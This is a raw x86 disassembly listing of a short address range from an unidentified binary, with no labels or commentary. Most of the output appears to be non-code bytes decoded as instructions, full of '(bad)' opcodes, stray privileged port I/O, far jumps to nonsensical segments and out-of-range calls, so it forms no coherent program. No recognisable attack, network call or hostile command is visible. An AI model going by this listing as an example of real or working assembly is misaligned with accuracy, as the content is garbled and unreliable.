  4211b2:	add    BYTE PTR [ebx+0x129fbaf4],0xa5
  4211b9:	test   al,0x4e
  4211bb:	mov    eax,0x494453b5
  4211c0:	in     al,0x8c
  4211c2:	js     0x4211ef
  4211c4:	jae    0x4211dc
  4211c6:	cdq    
  4211c7:	(bad)  
  4211c8:	lea    eax,[esi*2-0x41644bb2]
  4211cf:	dec    esp
  4211d0:	scas   eax,DWORD PTR es:[edi]
  4211d1:	mov    BYTE PTR [ecx-0x6b],ch
  4211d4:	jl     0x421213
  4211d6:	xchg   DWORD PTR [ebx+0x73],edx
  4211d9:	cmp    eax,0xa6804435
  4211de:	scas   al,BYTE PTR es:[edi]
  4211df:	ins    DWORD PTR es:[edi],dx
  4211e0:	cdq    
  4211e1:	adc    BYTE PTR [edi],dh
  4211e3:	clc    
  4211e4:	push   es
  4211e5:	jecxz  0x4211e6
  4211e7:	jns    0x421199
  4211e9:	lds    ecx,FWORD PTR [ecx-0x6644335f]
  4211ef:	push   0x7b
  4211f1:	test   BYTE PTR [esi],0x87
  4211f4:	fsubr  DWORD PTR [ebx]
  4211f6:	aaa    
  4211f7:	push   eax
  4211f8:	hlt    
  4211f9:	cmp    WORD PTR [ecx+eiz*1],dx
  4211fd:	pop    ds
  4211fe:	add    DWORD PTR [ebp+0x43416eb2],edx
  421204:	int3   
  421205:	fsubr  QWORD PTR [ebp-0x2f]
  421208:	in     eax,dx
  421209:	daa    
  42120a:	push   0x0
  42120c:	scas   eax,DWORD PTR es:[edi]
  42120d:	push   ebp
  42120e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42120f:	jg     0x421212
  421211:	nop
  421212:	in     al,dx
  421213:	mov    esp,0x48ceb1cf
  421218:	xchg   ebp,eax
  421219:	test   DWORD PTR [eax-0x3350c90e],0x82688505
  421223:	sub    edx,ebp
  421225:	jmp    0x421230
  421227:	push   edi
  421228:	xor    esi,DWORD PTR [ebp+esi*1+0xc483763]
  42122f:	into   
  421230:	mov    ds:0x945711d,al
  421235:	inc    edx
  421236:	push   ebp
  421237:	jnp    0x42124d
  421239:	cmc    
  42123a:	imul   esi,DWORD PTR [esp+ebp*4-0xd67cd13],0x7d
	...
  4212b1:	add    BYTE PTR [eax],al
  4212b3:	add    BYTE PTR [ecx+0x6],al
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x5e83dc15
  4212c1:	pop    ecx
  4212c2:	xchg   ebx,eax
  4212c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212c4:	outs   dx,BYTE PTR ds:[esi]
  4212c5:	arpl   WORD PTR [ecx],ax
  4212c7:	add    dh,dh
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    bl,ah
  4212cd:	mov    dh,0x83
  4212cf:	daa    
  4212d0:	lea    ecx,[ebx-0x52b5e13f]
  4212d6:	xor    BYTE PTR [edx+0x59693056],ch
  4212dc:	test   BYTE PTR [ebx],al
  4212de:	mov    ds:0x36b77b13,eax
  4212e3:	ins    DWORD PTR es:[edi],dx
  4212e4:	lods   al,BYTE PTR ds:[esi]
  4212e5:	pop    esp
  4212e6:	adc    DWORD PTR [ebx],esi
  4212e8:	xchg   BYTE PTR [ebp-0xc],dh
  4212eb:	xchg   esi,eax
  4212ec:	in     eax,dx
  4212ed:	push   ds
  4212ee:	arpl   WORD PTR [ecx+ebx*1],dx
  4212f1:	enter  0x5603,0xd5
  4212f5:	pop    ebx
  4212f6:	cmp    ebx,ecx
  4212f8:	jg     0x421332
  4212fa:	popf   
  4212fb:	sub    al,0x94
  4212fd:	in     eax,0x3c
  4212ff:	jge    0x42134b
  421301:	mov    esp,0xdcc920a5
  421306:	adc    al,0xde
  421309:	sub    dh,al
  42130b:	xchg   esi,eax
  42130c:	scas   al,BYTE PTR es:[edi]
  42130d:	inc    ebx
  42130e:	shr    DWORD PTR [ecx-0x5c],0x80
  421312:	xor    DWORD PTR [ebp+0x5f],edi
  421315:	xchg   esi,eax
  421316:	or     BYTE PTR [eax+0x5b],dl
  421319:	and    ebx,DWORD PTR ds:0x5b5a693a
  42131f:	retf   
  421320:	stos   BYTE PTR es:[edi],al
  421321:	sub    ecx,ebp
  421323:	adc    dl,bh
  421325:	fcom   QWORD PTR [edi]
  421327:	in     al,dx
  421328:	inc    edx
  421329:	and    eax,0x8786d35e
  42132e:	pushf  
  42132f:	mov    ch,bh
  421331:	outs   dx,BYTE PTR ds:[esi]
  421332:	ja     0x4212cb
  421334:	xor    al,0xd
  421336:	jno    0x421355
  421338:	push   ecx
  421339:	or     DWORD PTR [edi],esi
  42133b:	pop    eax
  42133c:	cmp    BYTE PTR [edx+edx*4+0x65],dh
  421340:	iret   
  421341:	es inc edi
  421343:	(bad)  
  421344:	xor    eax,0xc583a147
  421349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42134a:	jp     0x4213b1
  42134c:	sti    
  42134d:	cli    
  42134e:	xchg   edx,eax
  42134f:	add    eax,0xb32dd7cc
  421354:	retf   
  421355:	test   BYTE PTR [esi+ebp*4+0x5f],dh
  421359:	sub    eax,0xa4e34666
  42135e:	in     al,dx
  42135f:	pop    edx
  421360:	push   eax
  421361:	jb     0x421364
  421363:	inc    ebp
  421364:	in     eax,0x4d
  421366:	fdiv   QWORD PTR [eax+ecx*8-0x24]
  42136a:	cmp    DWORD PTR [edx],eax
  42136c:	enter  0xe052,0x23
  421370:	jp     0x42132e
  421372:	and    dl,0x6f
  421375:	or     eax,DWORD PTR [esi+ebp*4]
  421378:	mov    edx,0x9cae4691
  42137d:	adc    al,0x6e
  42137f:	scas   al,BYTE PTR es:[edi]
  421380:	pop    edi
  421381:	icebp  
  421382:	out    dx,eax
  421383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421384:	imul   edx,DWORD PTR [edi],0xffffffd4
  421387:	out    0x65,al
  421389:	cmp    eax,0x2ccc3584
  42138e:	stc    
  42138f:	in     al,dx
  421390:	push   edi
  421391:	es scas eax,DWORD PTR es:[edi]
  421393:	jb     0x42139e
  421395:	push   ecx
  421396:	fs mov al,0xc4
  421399:	add    esi,DWORD PTR [eax]
  42139b:	inc    edx
  42139c:	pop    edx
  42139d:	xchg   ebp,eax
  42139e:	stc    
  42139f:	jmp    0x37b0726a
  4213a4:	ror    DWORD PTR [edx],cl
  4213a6:	jge    0x42141b
  4213a8:	sub    DWORD PTR [edx-0x3e],ecx
  4213ab:	and    DWORD PTR [eax],esp
  4213ad:	mov    fs,WORD PTR [esi+0x65]
  4213b0:	mov    ds:0xa19b7315,eax
  4213b5:	xor    ecx,DWORD PTR [edi]
  4213b7:	iret   
  4213b8:	inc    ebx
  4213b9:	pop    es
  4213ba:	test   al,0x3a
  4213bc:	xor    al,0xaa
  4213be:	int    0x9a
  4213c0:	jmp    0x42143f
	...
  421432:	add    BYTE PTR [eax],al
  421434:	scas   al,BYTE PTR es:[edi]
  421435:	xchg   esp,eax
  421436:	push   edi
  421437:	adc    bh,BYTE PTR [edi-0x2d]
  42143a:	out    dx,eax
  42143b:	mov    esp,0x960320e2
  421440:	call   0x650f7e1e
  421445:	add    DWORD PTR fs:[eax],eax
  421448:	test   BYTE PTR [eax],0x0
  42144b:	add    BYTE PTR [ebx+0x493d10e8],ch
  421451:	pop    edi
  421452:	imul   edx,DWORD PTR [ebx+ebp*8],0x65
  421456:	dec    eax
  421457:	mov    edx,0x5d7643c2
  42145c:	mov    al,0x3b
  42145e:	cli    
  42145f:	je     0x421409
  421461:	data16 jge 0x421453
  421464:	(bad)  
  421466:	loop   0x4213f2
  421468:	jg     0x421402
  42146a:	xchg   DWORD PTR ds:0x1aa147f4,ecx
  421470:	xor    ch,BYTE PTR [edx-0x3a95cae0]
  421476:	sub    BYTE PTR [edx+0x22f6a9ed],ah
  42147c:	pop    esp
  42147d:	ret    0x667e
  421480:	jl     0x4214d5
  421482:	cli    
  421483:	jne    0x4214d1
  421485:	lds    edi,FWORD PTR [edx+ebx*8-0x57]
  421489:	sbb    eax,0xbae530d4
  42148e:	mov    edx,0xc7a411c8
  421493:	sub    eax,0xd10d4873
  421498:	in     eax,0x97
  42149a:	fwait
  42149b:	in     eax,0x91
  42149d:	sub    BYTE PTR [eax-0x42dbaac4],al
  4214a3:	sub    DWORD PTR [edx+0x447e7f63],eax
  4214a9:	xor    DWORD PTR [edx],eax
  4214ab:	loopne 0x421481
  4214ad:	ss push esp
  4214af:	jbe    0x4214cd
  4214b1:	lods   al,BYTE PTR ds:[esi]
  4214b2:	stc    
  4214b3:	pusha  
  4214b4:	fld    QWORD PTR [esi-0x30e04bdf]
  4214ba:	jmp    0xd6a4:0x8d2df87b
  4214c1:	mov    bh,0xca
  4214c3:	shr    bh,cl
  4214c5:	or     al,0xe0
  4214c7:	sbb    BYTE PTR [ecx+0xa],0xd1
  4214cb:	adc    eax,0x83afb081
  4214d0:	out    dx,al
  4214d1:	or     al,0xd
  4214d3:	mov    esp,0x77796193
  4214d8:	sub    ebp,DWORD PTR [edx+0x356e2852]
  4214de:	ja     0x4214e9
  4214e0:	retf   0xf61
  4214e3:	loope  0x421549
  4214e5:	mov    edx,0xc7332ad3
  4214ea:	and    al,0x36
  4214ec:	sub    DWORD PTR [eax+ecx*1],edi
  4214ef:	pop    esp
  4214f0:	jne    0x421570
  4214f2:	mov    cl,0xfc
  4214f4:	pop    ecx
  4214f5:	fldcw  WORD PTR [ebp+0x39]
  4214f8:	retf   0x3382
  4214fb:	jg     0x421551
  4214fd:	cmp    DWORD PTR [edx],edi
  4214ff:	pushf  
  421500:	inc    esi
  421501:	push   edi
  421502:	call   0xee1f7fb3
  421507:	xor    esp,esi
  421509:	ins    DWORD PTR es:[edi],dx
  42150a:	fmul   QWORD PTR [eax+ebx*8-0x3d]
  42150e:	cwde   
  42150f:	or     BYTE PTR [ecx],bh
  421511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421512:	dec    ebx
  421513:	ss adc al,0x2e
  421516:	mov    ds:0xa7fad14d,eax
  42151c:	cdq    
  42151d:	push   es
  42151e:	sub    al,0x47
  421520:	xchg   ebx,eax
  421521:	bound  ebx,QWORD PTR [esi]
  421523:	nop
  421524:	or     BYTE PTR [esi],ch
  421526:	xor    al,ch
  421528:	mov    edi,0x162120b5
  42152d:	add    DWORD PTR fs:[ecx+0x39],ebx
  421531:	inc    BYTE PTR [eax]
  421533:	mov    bl,0xba
  421535:	aam    0xc7
  421537:	jns    0x421583
  421539:	gs sub al,0x1c
  42153c:	cwde   
  42153d:	les    ebp,FWORD PTR [ecx+0xc6f578]
	...
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	es mov bh,0xa2
  4215c3:	neg    BYTE PTR [edx+0x65]
  4215c6:	add    DWORD PTR [eax],eax
  4215c8:	test   BYTE PTR [eax],0x0
  4215cb:	add    BYTE PTR [edx+ebx*2+0x46],cl
  4215cf:	stc    
  4215d0:	adc    al,0xcb
  4215d2:	cmp    ebp,DWORD PTR [edi-0x30eb0da7]
  4215d8:	or     BYTE PTR [edi-0x3002ed98],0xb1
  4215df:	scas   eax,DWORD PTR es:[edi]
  4215e0:	inc    edx
  4215e1:	not    DWORD PTR [esi+ebx*8-0x555c6e41]
  4215e8:	jg     0x421622
  4215ea:	push   esi
  4215eb:	sbb    dh,BYTE PTR [ecx]
  4215ed:	enter  0x8c7a,0xe4
  4215f1:	mov    esi,0x3c26c79
  4215f6:	sub    bh,cl
  4215f8:	and    al,0xe6
  4215fa:	pusha  
  4215fb:	rol    BYTE PTR [esi],0x48
  4215fe:	jle    0x4215d8
  421600:	gs or  eax,0x4ca050ed
  421606:	aaa    
  421607:	test   DWORD PTR [edx-0x68],eax
  42160a:	jge    0x4215c6
  42160c:	stos   DWORD PTR es:[edi],eax
  42160d:	mov    dh,0xfc
  42160f:	neg    DWORD PTR [ebx-0x25fbc9b8]
  421615:	das    
  421616:	wrssd  [edx],eax
  42161a:	scas   al,BYTE PTR es:[edi]
  42161b:	dec    eax
  42161c:	dec    esi
  42161d:	pop    es
  42161e:	fldcw  WORD PTR [edx]
  421620:	xchg   edx,eax
  421621:	aad    0x2f
  421623:	test   DWORD PTR [ebp+0x54e53ba5],esi
  421629:	mov    dl,0xf0
  42162b:	jmp    0x42168c
  42162d:	test   eax,0x318ce026
  421632:	jmp    FWORD PTR [edx-0x6ca55c45]
  421638:	dec    edx
  421639:	jbe    0x421672
  42163b:	jno    0x4215e5
  42163d:	sar    BYTE PTR [ecx-0x56c2d894],cl
  421643:	adc    BYTE PTR [edi],bh
  421645:	cmp    bh,BYTE PTR [edx+esi*4]
  421648:	push   cs
  421649:	fsub   DWORD PTR [ebx]
  42164b:	xor    al,0x11
  42164d:	xchg   edi,eax
  42164e:	push   edi
  42164f:	sbb    WORD PTR [edx-0x7eab5fde],0x8cb
  421658:	cmp    al,0x3c
  42165a:	dec    esi
  42165b:	mov    dl,0x50
  42165d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42165e:	fwait
  42165f:	jl     0x421690
  421661:	lods   eax,DWORD PTR ds:[esi]
  421662:	je     0x421655
  421664:	xor    al,0x8a
  421666:	ss or  eax,0x8e2e71ce
  42166c:	mov    bh,0x61
  42166e:	loopne 0x4215fc
  421670:	inc    esi
  421671:	int    0x1
  421673:	add    al,0x5
  421675:	sbb    eax,0xa4add407
  42167a:	loope  0x421657
  42167c:	mov    ch,0xf8
  42167e:	fldcw  WORD PTR [eax-0x6739a3ce]
  421684:	xrelease xchg DWORD PTR [ecx+0x57],esi
  421688:	mov    edx,0x54706e17
  42168d:	mov    ah,0xe0
  42168f:	xchg   BYTE PTR [edi],bh
  421691:	push   cs
  421692:	mov    ebp,0x21496059
  421697:	mov    dh,0xba
  421699:	mov    ah,0x28
  42169b:	xchg   esp,eax
  42169c:	stos   BYTE PTR es:[edi],al
  42169d:	icebp  
  42169e:	sbb    eax,0xa77108a8
  4216a3:	(bad)  
  4216a4:	jno    0x42166f
  4216a6:	xlat   BYTE PTR ds:[ebx]
  4216a7:	push   eax
  4216a8:	in     eax,0x64
  4216aa:	aam    0xa5
  4216ac:	scas   eax,DWORD PTR es:[edi]
  4216ad:	add    ebp,esp
  4216af:	fmul   QWORD PTR [ebx]
  4216b1:	push   ebp
  4216b2:	icebp  
  4216b3:	inc    esp
  4216b4:	fist   DWORD PTR [esi+0x5c]
  4216b7:	cs sub eax,0x409005e7
  4216bd:	pusha  
  4216be:	cmp    BYTE PTR [edx+edx*2+0xef],dh
	...
  421731:	add    BYTE PTR [eax],al
  421733:	add    BYTE PTR [ecx-0x587fdad1],cl
  421739:	mov    ch,BYTE PTR [ebp-0x7e7b35d1]
  42173f:	cmp    eax,DWORD PTR [ebp+0x50e734c1]
  421745:	add    WORD PTR [eax],ax
  421748:	test   BYTE PTR [eax],0x0
  42174b:	add    BYTE PTR [ecx-0x19],al
  42174e:	jnp    0x42173d
  421750:	fs aaa 
  421752:	iret   
  421753:	push   ebp
  421754:	and    dl,BYTE PTR [esi]
  421756:	stc    
  421757:	aam    0x98
  421759:	push   ds
  42175a:	test   DWORD PTR [eax],ebx
  42175c:	add    cl,BYTE PTR [ebp-0x19722a46]
  421762:	test   eax,0xa255ddc7
  421767:	adc    al,0x6
  421769:	shr    bh,1
  42176b:	mov    ecx,0xa1ebf54b
  421770:	imul   edi,edi,0x57
  421773:	out    dx,eax
  421774:	sub    cl,BYTE PTR [eax+eax*2-0x69]
  421778:	sahf   
  421779:	fwait
  42177a:	call   0x5309e016
  42177f:	sahf   
  421780:	pop    edi
  421781:	xor    edi,DWORD PTR [ecx+0x2add2257]
  421787:	dec    esp
  421788:	aad    0xca
  42178a:	xchg   dh,ah
  42178c:	ret    0x7115
  42178f:	xchg   ecx,eax
  421790:	inc    eax
  421791:	xor    ch,BYTE PTR [eax]
  421793:	fwait
  421794:	sbb    al,0xa3
  421796:	neg    BYTE PTR [ecx]
  421798:	test   ecx,eax
  42179a:	repz adc bh,BYTE PTR [esi+0x667cf31b]
  4217a1:	xor    eax,0x9ed250dc
  4217a6:	or     BYTE PTR ds:0x60c15a12,dl
  4217ac:	push   ebp
  4217ad:	mov    ebp,0x3479e3c8
  4217b2:	push   esi
  4217b3:	in     al,0x71
  4217b5:	jns    0x421756
  4217b7:	int    0xee
  4217b9:	ror    ecx,0x72
  4217bc:	xchg   BYTE PTR [ebp-0x143c5d40],al
  4217c2:	mov    esi,0x29fbeec
  4217c7:	cmp    eax,0xb7df207
  4217cc:	inc    ecx
  4217cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ce:	xchg   ebp,eax
  4217cf:	fsubr  st,st(1)
  4217d1:	fwait
  4217d2:	add    cl,BYTE PTR [ebx+0x10]
  4217d5:	xor    dl,BYTE PTR [esi+0x26564da9]
  4217db:	mov    dh,0x21
  4217dd:	add    eax,0xc5b81aa8
  4217e2:	ins    BYTE PTR es:[edi],dx
  4217e3:	cmp    BYTE PTR [esi+0x4d],dl
  4217e6:	cmp    ebp,DWORD PTR [eax]
  4217e8:	cmc    
  4217e9:	pop    ebx
  4217ea:	loopne 0x4217c1
  4217ec:	xchg   ecx,eax
  4217ed:	inc    edx
  4217ee:	push   esp
  4217ef:	pop    es
  4217f0:	frstor [edi-0x71fa2ea4]
  4217f6:	mov    ds:0xd1b007b6,al
  4217fb:	and    BYTE PTR [edx+0x5c],bl
  4217fe:	out    dx,eax
  4217ff:	pop    ds
  421800:	ja     0x4217e0
  421802:	push   edi
  421803:	xchg   edi,eax
  421804:	aad    0x61
  421806:	sahf   
  421807:	and    eax,DWORD PTR [ebp+0x43]
  42180a:	(bad)  
  42180b:	xchg   edx,eax
  42180c:	adc    dl,dh
  42180e:	lds    eax,FWORD PTR [eax+0x23]
  421811:	sbb    bl,BYTE PTR [eax]
  421813:	xchg   ebp,eax
  421814:	or     edi,DWORD PTR [edx]
  421816:	rol    BYTE PTR [ebx-0x60],1
  421819:	ja     0x421890
  42181b:	jmp    0x421846
  42181d:	iret   
  42181e:	dec    eax
  42181f:	push   ecx
  421820:	sub    ah,dh
  421822:	loope  0x4217c9
  421824:	test   al,0xb6
  421826:	lods   eax,DWORD PTR ds:[esi]
  421827:	jb     0x4217d6
  421829:	jbe    0xf092ed0e
  42182f:	inc    ebp
  421830:	jo     0x4217f9
  421832:	in     eax,0x6e
  421834:	sti    
  421835:	or     DWORD PTR [edx+0x6b6d2c07],0xb1713289
  42183f:	and    dl,BYTE PTR [ebx+ebp*8+0x0]
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    esi,DWORD PTR ds:0x4639ed7d
  4218c5:	add    DWORD PTR [bx+si],eax
  4218c8:	test   BYTE PTR [eax],0x0
  4218cb:	add    BYTE PTR [edi+0x28],ch
  4218ce:	pushf  
  4218cf:	dec    ebp
  4218d0:	fbstp  TBYTE PTR [ecx]
  4218d2:	in     al,dx
  4218d3:	mov    bh,0xe2
  4218d5:	xor    ecx,DWORD PTR gs:[ebp-0x4e]
  4218d9:	jno    0x42186c
  4218db:	push   0x3
  4218dd:	js     0x421945
  4218df:	cmp    BYTE PTR [ecx],0x16
  4218e2:	daa    
  4218e3:	sbb    eax,0xe354814f
  4218e8:	push   ecx
  4218e9:	addr16 xchg ebp,eax
  4218eb:	fild   DWORD PTR [edx]
  4218ed:	aam    0x2f
  4218ef:	ins    DWORD PTR es:[edi],dx
  4218f0:	stc    
  4218f1:	adc    dl,BYTE PTR [ebx+0x504ad3b]
  4218f7:	loop   0x421882
  4218f9:	enter  0x3f78,0x81
  4218fd:	fisubr WORD PTR [ebx+0x288db86a]
  421903:	mov    esp,0x4d488ddf
  421908:	ja     0x42195f
  42190a:	mov    al,0xcb
  42190c:	ins    DWORD PTR es:[edi],dx
  42190d:	setp   BYTE PTR [eax+0x15ed539e]
  421914:	jmp    0x3d52:0xec884f11
  42191b:	data16 or al,0x5c
  42191e:	fimul  WORD PTR [ebx-0x2698437d]
  421924:	cmp    DWORD PTR [ebx+0x72a04ba7],ebp
  42192a:	inc    ebx
  42192b:	adc    eax,DWORD PTR [edi+0x59568e67]
  421931:	call   0x8f63f836
  421936:	out    dx,eax
  421937:	dec    edi
  421938:	das    
  421939:	mov    al,BYTE PTR [ebx]
  42193b:	arpl   ax,dx
  42193d:	(bad)  
  42193e:	imul   BYTE PTR [ecx+eax*2-0x5fde89d2]
  421945:	inc    ebp
  421946:	fwait
  421947:	dec    edx
  421948:	and    BYTE PTR [eax+eiz*1+0x3c],al
  42194c:	pop    ds
  42194d:	data16 add al,BYTE PTR [edx+0x3e]
  421951:	push   ecx
  421952:	add    eax,0xf8fcdb48
  421957:	nop
  421958:	mov    edx,DWORD PTR ds:0xa42b5c89
  42195e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42195f:	ret    
  421960:	ins    BYTE PTR es:[edi],dx
  421961:	dec    ebx
  421962:	cdq    
  421963:	mov    WORD PTR [esp+ebp*1-0x70],cs
  421967:	or     eax,0x31c711d3
  42196c:	jmp    0x732c:0xf11e8495
  421973:	imul   eax,DWORD PTR [esi-0x6d],0x2b
  421977:	push   cs
  421978:	jbe    0x421990
  42197a:	repz int 0x65
  42197d:	popf   
  42197e:	fiadd  DWORD PTR [ebx+0x75]
  421981:	push   esi
  421982:	(bad)  
  421983:	push   esp
  421984:	ss add eax,0x9e2a44e4
  42198a:	sbb    eax,0x6159b42c
  42198f:	(bad)
  421993:	sbb    ebx,DWORD PTR [esi-0x681db1cf]
  421999:	push   ecx
  42199a:	pop    eax
  42199b:	rcl    BYTE PTR [eax+eax*8-0x577e48a5],0x77
  4219a3:	mov    ebx,0x2798ff39
  4219a8:	mov    eax,ds:0x33c43c5b
  4219ad:	inc    edi
  4219ae:	shl    cl,1
  4219b0:	aad    0xed
  4219b2:	out    0xd2,al
  4219b4:	mov    edi,0x4f050ea1
  4219b9:	or     al,BYTE PTR [edi]
  4219bb:	leave  
  4219bc:	mov    WORD PTR [eax-0x18],?
  4219bf:	dec    ebp
  4219c0:	aad    0xf1
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x25f13129]
  421a44:	cmp    al,0x68
  421a46:	add    DWORD PTR [eax],eax
  421a48:	test   BYTE PTR [eax],0x0
  421a4b:	add    BYTE PTR [edx+0x5763e3eb],cl
  421a51:	stc    
  421a52:	jmp    0xc405:0xdd982ae2
  421a59:	pushf  
  421a5a:	push   0xffffffe0
  421a5c:	jno    0x4219e2
  421a5e:	adc    al,0xe3
  421a60:	add    al,0xe0
  421a62:	(bad)  
  421a63:	jno    0x421a4c
  421a65:	stos   BYTE PTR es:[edi],al
  421a66:	pop    esi
  421a67:	sub    BYTE PTR [esp+eiz*4+0x6a50f23f],cl
  421a6e:	xchg   esp,eax
  421a6f:	icebp  
  421a70:	fadd   QWORD PTR [esi+0x3da07810]
  421a76:	and    ah,BYTE PTR [esi]
  421a78:	sub    eax,0xbb401eae
  421a7d:	stos   DWORD PTR es:[edi],eax
  421a7e:	inc    DWORD PTR [edi+esi*2-0x17df1efd]
  421a85:	inc    eax
  421a86:	dec    BYTE PTR [edx-0x68c2da5c]
  421a8c:	cld    
  421a8d:	popa   
  421a8e:	mov    dh,0xc8
  421a90:	stos   BYTE PTR es:[edi],al
  421a91:	aaa    
  421a92:	mov    WORD PTR [ecx-0x3d],ss
  421a95:	push   cs
  421a96:	jo     0x421a7d
  421a98:	pusha  
  421a99:	mov    bh,0x9c
  421a9b:	loope  0x421a39
  421a9d:	in     eax,dx
  421a9e:	fisubr DWORD PTR [esi]
  421aa0:	add    eax,0x8ab22b3c
  421aa5:	repz mov bh,0x10
  421aa8:	retf   0xb128
  421aab:	xchg   esp,eax
  421aac:	inc    ecx
  421aad:	pop    ebx
  421aae:	outs   dx,DWORD PTR ds:[esi]
  421aaf:	jl     0x421ad4
  421ab1:	ins    DWORD PTR es:[edi],dx
  421ab2:	es mov ebp,0xc5c78873
  421ab8:	setge  BYTE PTR [esi]
  421abb:	aaa    
  421abc:	jmp    0xf24a9039
  421ac1:	or     cl,al
  421ac3:	dec    ecx
  421ac4:	jmp    0x421b31
  421ac6:	xchg   ecx,eax
  421ac7:	nop
  421ac8:	les    edi,FWORD PTR [ecx-0x59]
  421acb:	mov    edi,0x46497113
  421ad0:	or     BYTE PTR ds:0xdb455660,dl
  421ad6:	cmp    al,0x6a
  421ad8:	mov    al,0xf6
  421ada:	jb     0x421b28
  421adc:	xlat   BYTE PTR ds:[ebx]
  421add:	nop
  421ade:	push   ebx
  421adf:	lods   al,BYTE PTR ds:[esi]
  421ae0:	ret    0x2f27
  421ae3:	aad    0xd
  421ae5:	(bad)  
  421ae6:	sbb    al,BYTE PTR [eax]
  421ae8:	inc    ebp
  421ae9:	mov    esi,0xa1787861
  421aee:	cdq    
  421aef:	lods   eax,DWORD PTR ds:[esi]
  421af0:	xchg   edi,eax
  421af1:	dec    eax
  421af2:	dec    edx
  421af3:	sbb    cl,dh
  421af5:	sbb    dh,BYTE PTR [ebp+ecx*4+0x11f840a8]
  421afc:	dec    edi
  421afd:	pop    es
  421afe:	mov    ds:0xea2898d5,eax
  421b03:	mov    es,WORD PTR [edx]
  421b05:	addr16 or eax,0xa13aaa38
  421b0b:	dec    ecx
  421b0c:	mov    ds:0x3c75e864,al
  421b11:	imul   edx,DWORD PTR [edi+0x73],0x3c
  421b15:	inc    eax
  421b16:	jp     0x421b0c
  421b18:	xchg   DWORD PTR [edi+eax*4-0x1b],ecx
  421b1c:	das    
  421b1d:	sub    dh,BYTE PTR [edi]
  421b1f:	sbb    esp,DWORD PTR [eax+0x5b452f23]
  421b25:	daa    
  421b26:	imul   esi,DWORD PTR [eax-0x1c],0x79b0bae8
  421b2d:	push   esp
  421b2e:	leave  
  421b2f:	lds    edx,FWORD PTR [edi+0x1f9be4bb]
  421b35:	jecxz  0x421ac6
  421b37:	pop    ds
  421b38:	mov    ah,0xeb
  421b3a:	inc    edi
  421b3b:	loopne 0x421b09
  421b3d:	ds mov edx,0x62b502
	...
  421bb3:	add    BYTE PTR [edx-0x604ef4eb],cl
  421bb9:	mov    edi,0x2d6a3fba
  421bbe:	scas   al,BYTE PTR es:[edi]
  421bbf:	sub    esi,eax
  421bc1:	scas   al,BYTE PTR es:[edi]
  421bc2:	jecxz  0x421bfd
  421bc4:	xor    ch,BYTE PTR [ecx+0x1]
  421bc7:	add    dh,dh
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [ecx],cl
  421bcd:	fadd   QWORD PTR [eax-0xc]
  421bd0:	jg     0x421c48
  421bd2:	mov    edi,0x1a5d0033
  421bd7:	mov    ah,0xb2
  421bd9:	aas    
  421bda:	cmc    
  421bdb:	inc    ecx
  421bdc:	cld    
  421bdd:	fcom   QWORD PTR [edi+0x4dcee9d4]
  421be3:	pop    es
  421be4:	fcmovu st,st(0)
  421be6:	dec    esp
  421be7:	and    al,0x84
  421be9:	mov    dh,ah
  421beb:	fidivr DWORD PTR [edi+0x5b]
  421bee:	call   0x845f7967
  421bf3:	outs   dx,BYTE PTR ds:[esi]
  421bf4:	or     bl,BYTE PTR [ebp-0x23]
  421bf7:	pop    eax
  421bf8:	add    BYTE PTR [edi-0x64],bl
  421bfb:	cmp    al,0x8c
  421bfd:	inc    ecx
  421bfe:	mov    esp,0x4ab28ddc
  421c03:	xchg   ebx,eax
  421c04:	mov    ebp,0xefcd7a24
  421c09:	mov    DWORD PTR [eax+eiz*1],edi
  421c0c:	adc    bh,al
  421c0e:	push   ebp
  421c0f:	sbb    dh,ah
  421c11:	loope  0x421c46
  421c13:	sub    ah,al
  421c15:	arpl   bp,dx
  421c17:	ds pop ecx
  421c19:	fcmovb st,st(1)
  421c1b:	mov    dh,0x5d
  421c1d:	xlat   BYTE PTR ds:[bx]
  421c1f:	lods   eax,DWORD PTR ds:[esi]
  421c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c21:	inc    edi
  421c22:	je     0x421ca2
  421c24:	fistp  WORD PTR [edx+0x794a8a7b]
  421c2a:	push   cs
  421c2b:	lea    ebx,[ebp-0x34]
  421c2e:	or     al,0x3e
  421c30:	mov    esi,0xb2aaee74
  421c35:	cdq    
  421c36:	mov    eax,0x70fc8b35
  421c3b:	call   0xfe5f:0x964ad730
  421c42:	jmp    0x421caf
  421c44:	mov    bl,0xf
  421c46:	push   edx
  421c47:	mov    edx,eax
  421c49:	pop    ebx
  421c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c4b:	sbb    ah,BYTE PTR [esi-0x4d9b1bd9]
  421c51:	jnp    0x421bd4
  421c53:	sbb    bl,BYTE PTR [esi+0x19b789c8]
  421c59:	cmp    cl,ah
  421c5b:	out    dx,eax
  421c5c:	and    ch,bh
  421c5e:	test   eax,0xad8ec8f0
  421c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c64:	add    ebx,DWORD PTR [esp+esi*2]
  421c67:	pushf  
  421c68:	sub    cl,dl
  421c6a:	jb     0x421cb1
  421c6c:	arpl   WORD PTR [edi+0x4b],si
  421c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
